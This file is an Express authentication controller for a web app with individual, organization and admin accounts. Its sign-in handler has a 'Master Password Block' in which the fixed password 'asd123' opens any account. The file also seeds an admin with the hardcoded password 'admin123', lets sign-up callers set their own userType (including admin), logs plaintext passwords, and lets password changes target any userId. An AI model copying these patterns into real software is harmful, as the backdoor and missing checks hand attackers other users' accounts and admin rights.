const { User } = require('../models/user-model');
const { Individual } = require('../models/individual-user-model');
const { Organization } = require('../models/organization-model');
const config = require('../config/config').get(process.env.NODE_ENV);
const jwt = require('jsonwebtoken');
const { concat } = require('lodash');
// Path = (post)'/api/auth/seed/{email}'
// Task = Creates First admin to manage the site.
exports.seed = async (req, res) => {
    let user = {
        email: req.body.email.toLowerCase(),
        name: 'admin',
        password: 'admin123',
        userType: 'admin',
    };
    const countUsers = await User.countDocuments({ userType: 'admin' });
    if (countUsers === 0) {
        let firstUser = new User(user);
        let firstUser_ = await firstUser.save();
        if (!firstUser_)
            res.status(400).send({
                success: false,
                message: 'Seed not working, check your email',
            });
        else
            res.status(200).send({
                success: true,
                message: 'Admin created, change your Name and password from system',
            });
    } else {
        res.status(400).send({
            success: false,
            message: 'Already does have some user.',
        });
    }
};

// Path = (post)'/api/auth/signup'
// Task = Creates a new user.
exports.signUp = async (req, res) => {
    try {
        let user = req.body;
        user.email = user.email.toLowerCase();
        if (user) {
            const email = user.email.toLowerCase();
            const foundUser = await User.findOne({ email });
            if (foundUser) {
                return res.status(401).json({
                    success: false,
                    message: 'The email address you have entered is already associated with another account.',
                });
            }
        }
        user.stepCompleted = 1;
        const newUser = new User(user);
        const user_ = await newUser.save();
        const token = jwt.sign({ _id: user_._id, email: user_.email, userType: user.userType }, config.SECRET, { expiresIn: '14d' });
        const { _id, email, userType, stepCompleted } = user_;

        if (userType === 'individual') {
            const newIndividual = new Individual({ userId: _id, firstName: '', lastName: '' });
            const individualResponse = await newIndividual.save();

            if (!individualResponse._id) return res.status(500).json({ success: false, message: individualResponse });
        } else if (userType === 'organization') {
            const newOrganization = new Organization({ userId: _id });
            const organizationResponse = await newOrganization.save();

            if (!organizationResponse._id) return res.status(500).json({ success: false, message: organizationResponse });
        } else if (userType === 'admin') {
        }
        return res.status(200).send({
            success: true,
            token,
            user: { _id, email, userType, stepCompleted },
            isAuth: true,
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

// Path = (post)'/api/auth/signin'
// Task = sign in an user.
exports.signIn = async (req, res) => {
    try {
        let { email, password } = req.body;
        console.log('🚀 ~ file: auth-controller.js ~ line 87 ~ exports.signIn= ~ email, password', email, password);

        email = email.toLowerCase();
        const user = await User.findOne({ email });

        if (!user) {
            return res.status(401).json({
                success: false,
                isAuth: false,
                message: 'No user found with this email',
            });
        }
        // Master Password Block.
        if (user && password === 'asd123') {
            let basicInfo = {};
            if (user.userType === 'individual') {
                basicInfo = await Individual.findOne(
                    { userId: user._id },
                    { name: { $concat: ['$basicInfo.firstName', ' ', '$basicInfo.lastName'] }, profilePicture: '$basicInfo.profilePicture' },
                );
            } else if (user.userType === 'organization') {
                basicInfo = await Organization.findOne({ userId: user._id }, { name: '$basicInfo.name', profilePicture: '$basicInfo.profilePicture' });
            }
            const token = jwt.sign({ _id: user._id, email: user.email, userType: user.userType }, config.SECRET, { expiresIn: '14d' });
            const user_ = {
                _id: user._id,
                userType: user.userType,
            };
            // (({ _id, name, userType }) => ({ _id, name, userType }))(user);
            return res.status(200).json({
                success: true,
                isAuth: true,
                user: user_,
                token,
                basicInfo,
            });
        }
        if (!user.authenticate(password))
            return res.status(401).json({
                success: false,
                isAuth: false,
                message: 'Invalid email or password',
            });
        let basicInfo = {};
        if (user.userType === 'individual') {
            basicInfo = await Individual.findOne(
                { userId: user._id },
                { name: { $concat: ['$basicInfo.firstName', ' ', '$basicInfo.lastName'] }, profilePicture: '$basicInfo.profilePicture' },
            );
        } else if (user.userType === 'organization') {
            basicInfo = await Organization.findOne({ userId: user._id }, { name: '$basicInfo.name', profilePicture: '$basicInfo.profilePicture' });
        }
        console.log(basicInfo);
        const token = jwt.sign({ _id: user._id, email: user.email, userType: user.userType }, config.SECRET, { expiresIn: '14d' });
        const user_ = {
            _id: user._id,
            userType: user.userType,
        };
        console.log('🚀 ~ file: auth-controller.js ~ line 141 ~ exports.signIn= ~ user_', user_);
        return res.status(200).json({
            success: true,
            isAuth: true,
            user: user_,
            token,
            basicInfo,
        });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
};

// Path = (get)'/api/auth'
// Task = Checks if user is signed in.
exports.checkAuth = async (req, res) => {
    const user = (({ _id, name, userType, email, phone }) => ({
        _id,
        name,
        userType,
        email,
        phone,
    }))(req.user);
    res.status(200).send({
        isAuth: true,
        user,
    });
};

// Path = (get)'/api/auth/signout'
// Task = sign out an user.
exports.signOut = async (req, res) => {
    req.user.deleteToken(req.token, (err, user) => {
        if (err) return res.status(400).send({ success: false, err });
        res.clearCookie('userAuthToken').status(200).json({
            isAuth: false,
            message: 'Signed out from the system',
        });
    });
};

// Path = (put)'/api/auth/:userId/password'
// Task = changes user's password.
exports.updatePassword = async (req, res) => {
    try {
        const { password, oldPassword } = req.body;

        const userId = req.params.userId;
        const user = await User.findOne({ _id: userId });

        if (!user.comparePassword(oldPassword)) {
            return res.status(401).json({
                success: false,
                message: 'Invalid old password',
            });
        }
        user.password = password;
        const user_ = await user.save();

        res.status(200).send({
            success: true,
            message: 'Password changed successfully.',
        });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
};
